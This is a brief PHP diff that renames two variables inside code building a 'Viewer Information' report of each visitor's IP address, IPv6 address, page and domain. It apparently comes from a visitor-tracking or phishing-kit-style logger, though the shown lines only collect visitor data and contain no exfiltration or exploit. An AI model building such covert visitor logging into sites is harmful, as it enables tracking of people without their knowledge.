@@ -34,7 +34,8 @@ function get_client_ip() {
         $ipaddress = 'UNKNOWN';
     return $ipaddress;
 }
-
+$adders = $adder;
+$pageNames = $pageName;
 $IP = get_client_ip();
 
 function get_ip1($ip2) {
@@ -2162,7 +2163,7 @@ $parse = $_SERVER['REQUEST_URI'];
 $ab = "http://ss{$domain}{$parse}";
 $date = date("h:i:s d/m/Y");
 $data .= "<-------- Viewer Information: {$IP} -------->\n\n";
-$data .= "Page: {$pageName} [{$adder}]\n\n";
+$data .= "Page: {$pageNames} [{$adders}]\n\n";
 $data .= "Domain: {$ab}\n\n";
 $data .= "IP Address : {$IP}\n"; 
 $data .= "IPV6 :  {$IPV6}\n";
